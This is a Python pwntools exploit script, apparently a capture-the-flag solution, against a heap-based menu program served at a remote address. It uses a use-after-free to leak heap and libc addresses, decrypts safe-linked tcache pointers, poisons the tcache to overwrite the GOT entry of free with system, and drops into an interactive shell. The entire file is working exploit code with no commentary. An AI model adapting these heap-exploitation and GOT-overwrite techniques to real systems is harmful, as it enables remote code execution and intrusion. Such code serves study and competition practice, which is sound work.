#!/usr/bin/env python3

from pwn import *
elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
#p = process("./chall_patched")
p = remote("34.90.214.14", 1337)
def sl(choice): p.sendlineafter("Option: ", str(choice))
def alloc(idx, size):
    sl(1)
    p.sendlineafter("Slot: ", str(idx))
    p.sendlineafter("Size: ", str(size))
def edit(idx, content):
    sl(2)
    p.sendlineafter("Slot: ", str(idx))
    p.sendlineafter("content: ", content)
def free(idx):
    sl(3)
    p.sendlineafter("Slot: ", str(idx))
def view(idx):
    sl(4)
    p.sendlineafter("Slot: ", str(idx))
def alpha(heap, target):
    return target ^ (heap >> 0xc)
def x(): 
    gdb.attach(p, gdbscript= """
               set resolve-heap-via-heuristic on
               """)
def decrypt(cipher):
    key = 0
    for i in range(1, 6):
        bits = 64 - 12 * i
        if bits < 0:
            bits = 0
        plain = ((cipher ^ key) >> bits) << bits
        key = plain >> 12
    return plain



def main():
    alloc(0, 0x100)
    alloc(1, 0x100)
    alloc(2, 0x10)
    free(1)
    free(0)
    view(0)
    heap_base = u64(p.recvline().strip(b"\n").ljust(8, b"\x00"))
    heap_base = decrypt(heap_base) - 0x3b0
    print(hex(heap_base))
    alloc(3, 0x500)
    alloc(4, 0x10)
    free(3)
    view(3)
    libc.address = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) - 0x219ce0
    print(hex(libc.address))
    edit(0, p64(alpha(heap_base, libc.sym.environ)))
    alloc(0, 0x100)
    alloc(1, 0x100)
    view(1)
    stack = u64(p.recvline().strip(b"\n").ljust(8, b"\x00")) #- 0x1b0
    print(hex(stack))
    alloc(5, 0x200)
    alloc(6, 0x200)
    free(5)
    free(6)
    edit(6, p64(alpha(heap_base, elf.got.free - 0x8)))
    alloc(5, 0x200)
    alloc(6, 0x200)
    edit(6, p64(libc.sym.system) * 2 + p64(libc.sym.puts) + p64(0x401050))
    edit(2, b"/bin/sh\x00")
 
    #x()
    p.interactive()


if __name__ == "__main__":
    main()
